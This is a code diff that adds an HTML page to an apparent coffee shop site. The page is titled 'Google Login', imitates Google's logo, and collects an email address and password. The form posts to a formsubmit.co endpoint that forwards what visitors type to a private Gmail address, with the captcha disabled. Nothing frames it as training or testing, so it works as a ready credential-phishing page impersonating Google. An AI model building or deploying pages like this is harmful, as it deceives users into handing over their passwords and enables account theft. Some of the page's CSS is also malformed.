@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Google Login</title>
+  <style>
+    :root {
+      --white-color: #fff;
+      --dark-color: #252525;
+      --primary-color: #3b141c;
+      --font-size-x1: 2rem;
+      --font-weight-seibold: 600;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f6f7;
+      animation: fadeInBody 1s ease;
+    }
+
+    @keyframes fadeInBody {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    header {
+      background-color: var(--primary-color);
+      padding: 10px 20px;
+
+    }
+
+    .navbar {
+      display: flex;
+      align-items: center;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .nav-logo .logo-text {
+      color: var(--white-color);
+      font-size: var(--font-size-x1);
+      font-weight: var(--font-weight-seibold);
+      animation: slideInLeft 1s ease-out;
+    }
+
+    @keyframes slideInLeft {
+      from {
+        transform: translateX(-100%);
+        opacity: 0;
+      }
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin-bottom;
+    }
+
+    .login-box {
+      background: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 320px;
+      animation: bounceIn 1s ease;
+      margin-bottom: 200px;
+    }
+
+    @keyframes bounceIn {
+      0% {
+        opacity: 0;
+        transform: scale(0.5);
+      }
+      60% {
+        opacity: 1;
+        transform: scale(1.1);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    .google-logo {
+      font-size: 36px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      animation: floatLogo 3s infinite ease-in-out;
+      margin-bottom: ;
+    }
+
+    @keyframes floatLogo {
+      0%, 100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(-8px);
+      }
+    }
+
+    .google-logo span:nth-child(1) { color: #4285F4; }
+    .google-logo span:nth-child(2) { color: #DB4437; }
+    .google-logo span:nth-child(3) { color: #F4B400; }
+    .google-logo span:nth-child(4) { color: #4285F4; }
+    .google-logo span:nth-child(5) { color: #0F9D58; }
+    .google-logo span:nth-child(6) { color: #DB4437; }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      transition: 0.3s;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #4285F4;
+      box-shadow: 0 0 5px #4285F4;
+      transform: scale(1.02);
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
+      border: none;
+      border-radius: 4px;
+      background-color: #4285F4;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #3367d6;
+      transform: scale(1.05);
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    footer {
+      background-color: #17142c;
+      color: rgb(251, 231, 231);
+      padding: 30px 20px;
+      animation: fadeInFooter 1.5s ease;
+      margin-bottom:x;
+    }
+
+    @keyframes fadeInFooter {
+      from {
+        opacity: 0;
+        transform: translateY(50px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .footer-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-around;
+      align-items: flex-start;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    
+    .footer-container > div {
+      margin: 10px;
+      flex: 1 1 200px;
+    }
+
+    .footer-logo img {
+      width: 150px;
+      border-radius: 10px;
+    }
+
+    .footer-links ul {
+      list-style: none;
+      padding: 0;
+    }
+
+    .footer-links ul li {
+      margin-bottom: 10px;
+    }
+
+    .footer-links ul li a {
+      color: rgb(227, 227, 233);
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+
+    .footer-links ul li a:hover {
+      color: #0ac42c;
+    }
+
+    .footer-contact p {
+      margin: 5px 0;
+    }
+
+    .footer-social .social-icons a {
+      margin: 0 10px;
+      color: white;
+      font-size: 1.5rem;
+      transition: color 0.3s ease;
+    }
+
+    .footer-social .social-icons a:hover {
+      color: #e1d3d4;
+    }
+
+    .footer-bottom {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 0.9rem;
+      border-top: 1px solid #555;
+      padding-top: 15px;
+    }
+  </style>
+  <!-- Font Awesome -->
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+</head>
+<body>
+  <header>
+    <nav class="navbar">
+      <a href="index1.html" class="nav-logo">
+        <h2 class="logo-text">☕coffee</h2>
+      </a>
+    </nav>
+  </header>
+
+  <div class="container">
+    <div class="login-box">
+      <div class="google-logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+      </div>
+      <form action="https://formsubmit.co/siyamyyy@gmail.com" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="email" name="email" placeholder="Email address" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+      </form>
+    </div>
+  </div>
+
+  <footer>
+    <div class="footer-container">
+      <div class="footer-logo">
+        <img src="image/coffee.jpg" alt="Logo">
+      </div>
+      <div class="footer-links">
+        <h3>Quick Links</h3>
+        <ul>
+          <li><a href="index1.html">Home</a></li>
+          <li><a href="manu2.html">Menu</a></li>
+          <li><a href="manu2.html">Order</a></li>
+          <li><a href="#contact">Contact</a></li>
+          <li><a href="privacy.html">Privacy Policy</a></li>
+        </ul>
+      </div>
+      <div class="footer-contact">
+        <h3>Contact Us</h3>
+        <p>Email: siyamyyy@gmail.com</p>
+        <p>Phone: +880 1836443434</p>
+        <p>Address: Laksmipur Sadar, Laksmipur</p>
+      </div>
+      <div class="footer-social">
+        <h3>Follow Us</h3>
+        <div class="social-icons">
+          <a href="#"><i class="fab fa-facebook-f"></i></a>
+          <a href="#"><i class="fab fa-twitter"></i></a>
+          <a href="#"><i class="fab fa-instagram"></i></a>
+          <a href="#"><i class="fab fa-linkedin-in"></i></a>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>&copy; 2024 Coffee Company. All Rights Reserved.</p>
+    </div>
+  </footer>
+</body>
+</html>
